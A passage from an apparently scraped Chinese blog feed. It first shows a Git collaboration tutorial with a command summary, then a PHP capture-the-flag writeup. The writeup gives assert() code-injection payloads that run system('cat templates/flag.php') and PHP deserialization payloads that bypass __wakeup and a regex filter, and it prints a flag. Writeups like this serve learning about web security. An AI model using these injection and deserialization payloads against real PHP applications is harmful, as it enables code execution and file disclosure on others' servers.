class="meta">$</span><span class="bash"> cat env.txt</span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add env.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"add new env"</span></span></span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: 'git pull ...') before pushing again.</span><br><span class="line">hint: See the 'Note about fast-forwards' in 'git push --help' for details.</span><br></pre></td></tr></table></figure><blockquote><p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure><blockquote><p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --<span class="built_in">set</span>-upstream-to=origin/dev dev</span></span><br><span class="line">Branch 'dev' set up to track remote branch 'dev' from 'origin'.</span><br></pre></td></tr></table></figure><blockquote><p>再pull：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><blockquote><p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的<a href="#### 7.解决冲突">解决冲突</a>完全一样。解决后，提交，再push：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"fix env conflict"</span></span></span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure><p>因此，多人协作的工作模式通常是这样：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li></ol><p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p><h3 id="三、命令总结"><a href="#三、命令总结" class="headerlink" title="三、命令总结"></a>三、命令总结</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">`配置用户名`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br><span class="line"></span><br><span class="line">`初始化`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line"></span><br><span class="line">`将文件添加到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br><span class="line"></span><br><span class="line">`将文件提交到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br><span class="line"></span><br><span class="line">`查看当前仓库的状态`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">`查看修改的内容`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br><span class="line"></span><br><span class="line">`查看历史记录`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">`版本回退`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br><span class="line"></span><br><span class="line">`查看每一次命令的信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line"></span><br><span class="line">`丢弃工作区的修改`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br><span class="line"></span><br><span class="line">`删除文件`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line"></span><br><span class="line">`将本地仓库和远程仓库关联起来`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">"Your Github repository name"</span></span></span><br><span class="line"></span><br><span class="line">`查看远程库信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line"></span><br><span class="line">`查看远程库详细信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">`将本地仓库的内容推送到远程库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br><span class="line"></span><br><span class="line">`创建分支`+-----------------+</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch dev++</span></span><br><span class="line">+========== $ git checkout -b dev</span><br><span class="line">`切换分支`   ++</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev or $ git switch dev +-----------------+</span></span><br><span class="line"></span><br><span class="line">`查看当前分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch </span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（启用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（禁用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br><span class="line"></span><br><span class="line">`查看分支合并的情况`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br><span class="line"></span><br><span class="line">`删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br><span class="line"></span><br><span class="line">`强行删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br><span class="line"></span><br><span class="line">`储存当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line"></span><br><span class="line">`从当前分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br><span class="line"></span><br><span class="line">`创建Bug分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br><span class="line"></span><br><span class="line">`修复Bug（手动修复）`</span><br><span class="line"></span><br><span class="line">`从bug分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br><span class="line"></span><br><span class="line">`合并分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br><span class="line"></span><br><span class="line">`切换到干活的分支`</span><br><span class="line"></span><br><span class="line">`查看当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容并不删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line"></span><br><span class="line">`在不同的分支上同步修改bug的操作`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br><span class="line"></span><br><span class="line">`推送分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br><span class="line"></span><br><span class="line">`抓取分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">等价于：git fetch   git merge &lt;Branch Name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Git-教程&quot;&gt;&lt;a href=&quot;#一、Git-教程&quot; class=&quot;headerlink&quot; title=&quot;一、Git 教程&quot;&gt;&lt;/a&gt;一、Git 教程&lt;/h3&gt;&lt;h4 id=&quot;1-Git-介绍&quot;&gt;&lt;a href=&quot;#1-Git-介绍&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP相关题目writeup（持续更新）</title>
    <link href="https://muzibing.github.io/2020/07/28/2020.07.28%EF%BC%88142%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/28/2020.07.28（142）/</id>
    <published>2020-07-27T16:00:00.000Z</published>
    <updated>2020-08-17T14:28:15.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-函数漏洞问题"><a href="#0x00-函数漏洞问题" class="headerlink" title="0x00 函数漏洞问题"></a><font color="navy"><code>0x00 函数漏洞问题</code></font></h2><h3 id="【Jarvois-OJ-web】BabyPHP"><a href="#【Jarvois-OJ-web】BabyPHP" class="headerlink" title="【Jarvois OJ-web】BabyPHP"></a><font color="blue"><code>【Jarvois OJ-web】BabyPHP</code></font></h3><h4 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-1.png" alt></p><h4 id="2-GIT-源码泄露"><a href="#2-GIT-源码泄露" class="headerlink" title="2.GIT 源码泄露"></a><code>2.GIT 源码泄露</code></h4><p>通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">点击这里</a>，有关git的介绍可以<a href="https://muzibing.github.io/2020/07/29/2020.07.29（143）/">点击这里</a>，下面我们得到如下的文件及文件夹：</p><p><img src="/images/142-2.jpg" alt></p><h4 id="3-查看index-php源码"><a href="#3-查看index-php源码" class="headerlink" title="3.查看index.php源码"></a><code>3.查看index.php源码</code></h4><p>打开index.php源码，可以得到其中最为关键的一段代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也就是说把我们输入的page相关字符串解析为<code>assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)</code>，其中：</p><ul><li>strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了</li><li>assert()：检查一个断言是否为 <strong><code>FALSE</code></strong>，如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</li></ul></blockquote><h4 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4.构造payload"></a><code>4.构造payload</code></h4><blockquote><p>根据上文，我们可以构造如下payload：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：page = <span class="string">'.system("cat templates/flag.php").'</span></span><br><span class="line">payload2：page = <span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br></pre></td></tr></table></figure><blockquote><p>被运行时，在index.php中被执行的形式为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span><span class="string">', '</span>..<span class="string">') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="string">assert("file_exists('</span>templates<span class="string">'.system("cat templates/flag.php").'</span>.php<span class="string">')") or die("That file doesn'</span>t exist!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file = "</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//"</span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br><span class="line"><span class="string">assert("</span>file_exists(<span class="string">''</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">//')") or die("That file doesn't exist!");</span></span><br></pre></td></tr></table></figure><blockquote><p>注：不是很明白为什么这样构造</p></blockquote><h2 id="0x01-反序列化问题"><a href="#0x01-反序列化问题" class="headerlink" title="0x01 反序列化问题"></a><font color="navy"><code>0x01 反序列化问题</code></font></h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><code>基础知识</code></h3><blockquote><p>要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法；</p><p><code>问题一：序列化后的数据格式</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">tes1t</span></span></span><br><span class="line"><span class="class">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">private</span> $flag = <span class="string">"Inactive"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test2 = <span class="string">"test2"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $object = <span class="keyword">new</span> tes1t();</span><br><span class="line">&gt; $object-&gt;set_flag(<span class="string">"Inactive"</span>);</span><br><span class="line">&gt; $data = serialize($object);</span><br><span class="line">&gt; <span class="keyword">echo</span> $data;</span><br><span class="line">&gt; <span class="meta">?&gt;</span> </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>上述代码产生的数据格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; O:<span class="number">5</span>:<span class="string">"tes1t"</span>:<span class="number">4</span>:&#123;s:<span class="number">11</span>:<span class="string">"tes1tflag"</span>;s:<span class="number">8</span>:<span class="string">"Inactive"</span>;s:<span class="number">7</span>:<span class="string">"*test"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">8</span>:<span class="string">"*test2"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;&#125; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中：</p><ul><li>O：表示一个对象</li><li>5：表示对象名占4个字符</li><li>“teslt”：表示对象名</li><li>4：表示该对象有4个属性（不含方法）</li><li>private：tesltflag =&gt; %00teslt%00flag</li><li>protected：<em>test =&gt; %00\</em>%00test</li></ul><p><code>问题二：触发/绕过魔术函数的方法</code></p><p>首先介绍一下魔术方法：</p><ul><li><strong>construct()</strong>：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)</li><li><strong>wakeup()</strong>：unserialize()时会自动调用，反序列化无论如何都是要先调用<code>__wakeup</code>函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数<ul><li><strong>存在漏洞的PHP版本</strong>：PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li><strong>漏洞概述</strong>：<code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li><strong>漏洞原理</strong>：<code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code></li></ul></li><li><strong>destruct()</strong>：当对象被销毁时会自动调用</li><li><strong>toString()</strong>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong>：当从不可访问的属性读取数据</li><li><strong>call()</strong>：在对象上下文中调用不可访问的方法时触发</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<code>先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct()</code></p></blockquote><h3 id="【XCTF-web】unserialize3"><a href="#【XCTF-web】unserialize3" class="headerlink" title="【XCTF-web】unserialize3"></a><font color="blue"><code>【XCTF-web】unserialize3</code></font></h3><h4 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><blockquote><p>这里需要进行反序列化，并且要绕过 <code>__wakeup</code> 魔术函数，这里需要的知识点有：</p><ol><li>将数据序列化后的数据格式是什么样子？</li><li>如何绕过<code>__wakeup</code>函数？</li></ol></blockquote><h4 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>从上面的基础知识可以得到序列化后的数据格式，并且<code>当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过</code>，那么这里我们就可以构造出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到如下flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125;</span><br></pre></td></tr></table></figure><h3 id="【XCTF-web】Web-php-unserialize27"><a href="#【XCTF-web】Web-php-unserialize27" class="headerlink" title="【XCTF-web】Web_php_unserialize27"></a><font color="blue"><code>【XCTF-web】Web_php_unserialize27</code></font></h3><h4 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们一部分一部分的分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var))</span><br></pre></td></tr></table></figure><blockquote><p>也就是说我们解码后的输入的形式如果是<code>[oc]:\d+:</code>（不区分大小写）则会输出<code>stop hacking</code>，但是如果我们的输入是<code>O:+4:</code>，就可以绕过正则过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unserialize($var);</span><br></pre></td></tr></table></figure><blockquote><p>反序列化我们的var值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。</p></blockquote><h4 id="3-构造payload-1"><a href="#3-构造payload-1" class="headerlink" 